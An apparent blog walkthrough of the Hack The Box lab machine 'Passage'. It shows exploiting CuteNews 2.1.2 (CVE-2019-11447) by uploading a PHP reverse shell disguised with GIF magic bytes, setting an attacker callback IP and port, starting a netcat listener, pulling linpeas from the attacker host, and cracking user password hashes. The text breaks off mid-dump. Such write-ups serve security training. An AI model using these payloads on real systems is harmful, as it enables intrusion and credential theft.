<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <!-- iOS Safari -->
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <!-- Chrome, Firefox OS and Opera Status Bar Color -->
  <meta name="theme-color" content="#FFFFFF">
  <meta property="og:title" content="Passage - 10.10.10.206">
  
  <meta name="description" content="Medium-difficulty Linux box on exploiting CuteNews 2.1.2 CVE-2019-11447 and abusing Linux's official USB-creator tool to gain arbitrary file write as root.">
  <meta property="og:description" content="Medium-difficulty Linux box on exploiting CuteNews 2.1.2 CVE-2019-11447 and abusing Linux's official USB-creator tool to gain arbitrary file write as root.">
  
  <meta property="og:type" content="blog">
  <title>Passage - 10.10.10.206</title>
  <!-- Favicon -->
  
  <link rel="shortcut icon" href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fa5f479f2-9bc6-4717-a854-a228503e7e09%2FSu3h8Ebb_400x400.png?table=collection&id=92e319e1-0c5e-49c7-adc1-7d48fe74e022">
  
  <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
  <link rel="stylesheet" type="text/css"
    href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
  <link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
  <link rel="stylesheet" type="text/css" href="css/notablog.css">
  <link rel="stylesheet" type="text/css" href="css/theme.css">
  <style>
    :root {
      font-size: 18px;
    }

    .DateTagBar {
      margin-top: 1.0rem;
    }
  </style>
</head>

<body>
  <nav class="Navbar">
    <a href="index.html">
      <div class="Navbar__Btn"><span><img class="inline-img-icon" src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fa5f479f2-9bc6-4717-a854-a228503e7e09%2FSu3h8Ebb_400x400.png?table=collection&id=92e319e1-0c5e-49c7-adc1-7d48fe74e022"></span> <span>Home</span></div>
    </a>
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
  </nav>
  <header class="Header">
      
    <div class="Header__Spacer Header__Spacer--NoCover">
    </div>
    
    <div class="Header__Icon"><span><img class="inline-img-icon" src="https://www.hackthebox.eu/storage/avatars/ec88bbe570fd512ab370208e5139bb41.png"></span></div>
    
    <h1 class="Header__Title">Passage - 10.10.10.206</h1>
        
    <div class="DateTagBar">
          
      <span class="DateTagBar__Item DateTagBar__Date">Posted on Sat, Mar 13, 2021</span>
          
          
      <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--yellow">
          <a href="tag/Medium.html">Medium</a>
      </span>
      
      <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--orange">
          <a href="tag/Linux.html">Linux</a>
      </span>
      
      <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--red">
          <a href="tag/Web Application.html">Web Application</a>
      </span>
      
      <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--pink">
          <a href="tag/CuteNews.html">CuteNews</a>
      </span>
      
      <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--blue">
          <a href="tag/USBCreator.html">USBCreator</a>
      </span>
      
    </div>
    <div class="Article__Desc">
        Medium-difficulty Linux box on exploiting CuteNews 2.1.2 CVE-2019-11447 and abusing Linux's official USB-creator tool to gain arbitrary file write as root.
    </div>
        
  </header>
      <article id="https://www.notion.so/35401a222fec4bf1950c52ab34d27e1b" class="PageRoot PageRoot--FullWidth"><h2 id="https://www.notion.so/919f6cbb16d44954b390908400c99d31" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/919f6cbb16d44954b390908400c99d31"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Recon</span></span></h2><ul class="BulletedListWrapper"><li id="https://www.notion.so/795d7cd13f6045e8bf9b4232106c4149" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Port scan:</span></span><div id="https://www.notion.so/3588c92b38ea40b5b7a9296ec8165f41" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ nmap -p- 10.10.10.206 &gt; ports.nmap</code></span></span></p></div><pre id="https://www.notion.so/02599c46cdc24d9fb05ab7fb0ecf9109" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http</span></span></span></code></pre></li><li id="https://www.notion.so/c09aa8522c9a4969a79790b3d04c4595" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Targeted scan:</span></span><div id="https://www.notion.so/2fc2b92b19444ea3a7516f2cb85a3d72" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ nmap -sC -sV -p 22,80 10.10.10.206 &gt; targeted.nmap</code></span></span></p></div><pre id="https://www.notion.so/46d50a576994420faf32e0fa994c2f5a" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Passage News
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span></span></code></pre></li></ul><h2 id="https://www.notion.so/8d937a0c1a3f402596a18e340e8b186f" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/8d937a0c1a3f402596a18e340e8b186f"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Enumeration</span></span></h2><ul class="BulletedListWrapper"><li id="https://www.notion.so/e10593441a46498481c9304eb2cb6f28" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Navigate to webpage, appears to be a news board.</span></span></li><li id="https://www.notion.so/bc658ac4fca54c43b843b4405e90b96a" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Anonymous users can comment on articles, not XSS vulnerable.</span></span></li><li id="https://www.notion.so/18ae669c57344163b8c06f4a7a23b093" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Found usernames: nadav (admin), paul, sid, kim</span></span></li><li id="https://www.notion.so/5e877ed2daab4573acab8bfbee85ff70" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Found nameserver: passage.htb</span></span></li><li id="https://www.notion.so/62b0aa77874c40308c298c21243e4906" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Edit /etc/hosts and add the following line:</span></span><div id="https://www.notion.so/237059cd397046e099684d18b08d25a1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">10.10.10.206 passage.htb</code></span></span></p></div></li><li id="https://www.notion.so/2959060028bf4ac2b1280c32a4400371" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Re-navigate to webpage, no redirect.</span></span></li><li id="https://www.notion.so/acc0f48bc99f4bf88a4ce51b3c685458" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">dirbuster</code></span><span class="SemanticString"> failed, requests timed out.</span></span></li><li id="https://www.notion.so/ad70ef8841c744509dec15513a290323" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">An article on the website reveals that Fail2Ban was implemented, which locks the user out for 2 minutes when too many requests are received.</span></span></li><li id="https://www.notion.so/b75fdf44fe144fe9bc241ecb9c795319" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">crackmapexec</code></span><span class="SemanticString"> on SSH failed, also locked out by Fail2Ban.</span></span></li><li id="https://www.notion.so/22955277848743fd9a20904121f62e92" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Board is using CuteNews to publish and manage news articles.</span></span></li><li id="https://www.notion.so/e350b20fa2314ee587b5faa556ff557d" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Found login page: </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="http://10.10.10.206/CuteNews/index.php">http://passage.htb/CuteNews/index.php</a></span></span></li><li id="https://www.notion.so/af09d8431ceb4a19bd5f8058fe7cba9a" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Version info is exposed on the login page to be 2.1.2, which is vulnerable to RCE (CVE-2019-11447).</span></span><div id="https://www.notion.so/edf9f1d8ddad4d88a502ba4494859b60" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F64cc0975-c41e-482a-8a28-5bbd11addba0%2FUntitled.png?width=316&amp;table=block&amp;id=edf9f1d8-ddad-4d88-a502-ba4494859b60"><img src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F64cc0975-c41e-482a-8a28-5bbd11addba0%2FUntitled.png?width=316&amp;table=block&amp;id=edf9f1d8-ddad-4d88-a502-ba4494859b60" style="width:316px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div></li></ul><h2 id="https://www.notion.so/e9b2bb6e4df543ee87f2381c581aae9d" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/e9b2bb6e4df543ee87f2381c581aae9d"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Exploitation</span></span></h2><ul class="BulletedListWrapper"><li id="https://www.notion.so/9e0bb6e86ae9481a9cf4c454681bcd5e" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">An attacker can register as a regular user on the website, and abuse the avatar upload function in the profile area to upload a shell.</span></span></li><li id="https://www.notion.so/dbd42e57458a430f8e0708afa4e3599f" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">There is no limit on the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$imgsize</code></span><span class="SemanticString"> function in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/core/modules/dashboard.php</code></span><span class="SemanticString">, this allows the attacker to upload large files such as a PHP reverse shell.</span></span></li><li id="https://www.notion.so/fddd996851fc4625bbd1863265d836c4" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">The CMS uses only magic bytes to validate the file type, and ignores the file extension.</span></span></li><li id="https://www.notion.so/7562d44806be46bd9445c4d721268f49" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Therefore, the header content of the file can be forged to bypass the content filter, for example using the &quot;GIF&quot; header.</span></span></li></ul><div id="https://www.notion.so/f8f7d99b7d2443089cba09d8cdb0a6ce" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Method 1: RCE script (/php/webapps/48800.py)</strong></span></span></p></div><ul class="BulletedListWrapper"><li id="https://www.notion.so/f7c73c4721ba4b76884ece0f6bf1f33b" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">After entering the URL, we get a shell as www-data.</span></span><div id="https://www.notion.so/ec18c394782e4d689517f8c785685ef2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ whoami</code></span></span></p></div><pre id="https://www.notion.so/8b15eedf74b440a5a47ba9895b09c90c" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>www-data</span></span></span></code></pre></li><li id="https://www.notion.so/173d5db944ac44c9a55aa10015afca2d" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">We see that the malicious PHP uploaded by the script is using a forged header to trick the server into thinking the reverse shell is a GIF file.</span></span><div id="https://www.notion.so/a30a9a126e9844faab03a94c3eca7f8f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ file avatar_rkogueVVDP_rkogueVVDP.php</code></span></span></p></div><pre id="https://www.notion.so/2cb2ec7dca224959bf156c9e0e6e4aee" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>avatar_rkogueVVDP_rkogueVVDP.php: GIF image data 16188 x 26736</span></span></span></code></pre></li><li id="https://www.notion.so/d642c7850ce44ef2871a1e749278751c" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">The script also extracted SHA-256 hashes of users:</span></span><pre id="https://www.notion.so/8db575e95454451581180fa3e88dd785" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc</span></span></span></code></pre></li><li id="https://www.notion.so/62f1c7bcd32b4b26b68d18baadac4a2b" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Two common hashes were able to be cracked:</span></span><pre id="https://www.notion.so/820bd3a822c44525b323d58d011d4023" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd	sha256	atlanta1
4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc	sha256	egre55</span></span></span></code></pre></li><li id="https://www.notion.so/69468a83b1664b3688eeb47960e64cf2" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Found possible passwords:
atlanta1, egre55</span></span></li><li id="https://www.notion.so/253bb083860548879c3c2b3ff4693f6a" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">But let&#x27;s try to do it manually and understand how it works, no honour in being a skid!</span></span></li></ul><div id="https://www.notion.so/59a63193252d4809b0717d26b8953f92" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Method 2: Manual upload</strong></span></span></p></div><ul class="BulletedListWrapper"><li id="https://www.notion.so/6feeaf287fcf4e59a4aed26555e89f5a" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Using pentestmonkey&#x27;s PHP shell, edit the file to add the magic bytes for GIF at the start of file, also include the local </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ip</code></span><span class="SemanticString"> and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$port</code></span><span class="SemanticString">:</span></span><pre id="https://www.notion.so/edb194150d10431888316db556f317a4" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>GIF8;
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token operator">...</span>
<span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'10.10.14.18'</span><span class="token punctuation">;</span>
<span class="token variable">$port</span> <span class="token operator">=</span> <span class="token number">6969</span><span class="token punctuation">;</span></span></span></span></span></code></pre></li><li id="https://www.notion.so/6ae73a688d1c4b62b2c02d15482a7b39" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Register as a user on the website, and upload the PHP reverse shell as an avatar in the profile area.</span></span><div id="https://www.notion.so/e080aaba8717478787749e6d204ecdea" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F3530be9d-97ce-43cb-b6bb-1b3fbdbe6191%2FUntitled.png?width=482&amp;table=block&amp;id=e080aaba-8717-4787-8774-9e6d204ecdea"><img src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F3530be9d-97ce-43cb-b6bb-1b3fbdbe6191%2FUntitled.png?width=482&amp;table=block&amp;id=e080aaba-8717-4787-8774-9e6d204ecdea" style="width:482px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div></li><li id="https://www.notion.so/9a9a51805d40426a855c442ea8fd1d6d" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Upload success, now start a reverse listener on port 6969:</span></span><div id="https://www.notion.so/2ee0fa36af904ef0be8416c6ab70dc44" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ nc -lvnp 6969</code></span></span></p></div></li><li id="https://www.notion.so/5fc04e55fd6e4833bbeecdff8e18cee1" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Navigate to </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="http://passage.htb/CuteNews/uploads/avatar_samiko_avatar.php">http://passage.htb/CuteNews/uploads/avatar_samiko_avatar.php</a></span><span class="SemanticString"> to trigger the reverse shell.</span></span></li><li id="https://www.notion.so/aeac00cc621a41b8aafa91373e936412" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Get shell as www-data:</span></span><div id="https://www.notion.so/ee151babb03a43eb90d8866a290de95d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ whoami</code></span></span></p></div><pre id="https://www.notion.so/2f2465475a75477986eb3a2d03fa6bc7" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>www<span class="token operator">-</span>data</span></span></span></code></pre></li><li id="https://www.notion.so/3bb56a97cd4944e89fe69194dbeaf08d" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Found usernames in /home:
nadav, paul</span></span></li><li id="https://www.notion.so/32aeaa4329a743c2bc688285f185f817" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Host linpeas.sh on HTTP, upload through shell with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">curl</code></span><span class="SemanticString">:</span></span><div id="https://www.notion.so/4a90b7007ba64e40b86284ccf45e0786" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ curl 10.10.14.18:9090/linpeas.sh -O</code></span></span></p></div></li><li id="https://www.notion.so/62d1cd1272f94a3c87226351560f3bbe" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Make LinPEAS executable:</span></span><div id="https://www.notion.so/8b77c62449604dad8cd1c6c49107ca15" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ chmod +x ./linpeas.sh</code></span></span></p></div></li><li id="https://www.notion.so/4869cef9d4c44cb49cb85524a52b429e" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Nothing useful from LinPEAS.</span></span></li><li id="https://www.notion.so/297e7d1b601e4b71bb2c69b20a589433" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Found file containing user hashes from earlier: </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/var/www/html/CuteNews/cdata/users/lines</code></span></span></li><li id="https://www.notion.so/eb9a9f7b3ac545f9a9a49bc9747300a7" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">This entire directory is also exposed on </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="http://passage.htb/CuteNews/cdata/">http://passage.htb/CuteNews/cdata/</a></span></span></li><li id="https://www.notion.so/5252f5cd50064f8cad9ef361837ddd55" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Lines are encoded in base64, decode with:</span></span><div id="https://www.notion.so/ccd98b5a22cf46f980d278c7718237c0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ base64 --decode hash.txt &gt; decoded.txt</code></span></span></p></div></li><li id="https://www.notion.so/32e3af0992d94882947a9d3a55ac2a7d" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">The lines are shuffled and line breaks are missing. After rearranging, we get the following dump:</span></span><pre id="https://www.notion.so/ba823013d5454c5099e7dd959fa3dc61" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token argument-name">a</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">;</span><span class="token argument-name">a</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">i</span><span class="token punctuation">:</span><span class="token number">1592483236</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"paul-coles"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token argument-name">a</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">;</span><span class="token argument-name">a</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"paul-coles"</span><span class="token punctuation">;</span><span class="token argument-name">a</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"1592483236"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"paul-coles"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"acl"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"2"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"email"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"paul@passage.htb"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"nick"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Paul Coles"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"pass"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">64</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"lts"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"1592485556"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"ban"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"0"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"cnt"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"2"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token argument-name">a</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"email"</span><span class="token punctuation">;</span><span class="token argument-name">a</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"paul@passage.htb"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"paul-coles"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>

<span class="token argument-name">a</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">;</span><span class="token argument-name">a</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">i</span><span class="token punctuation">:</span><span class="token number">1598829833</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"egre55"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
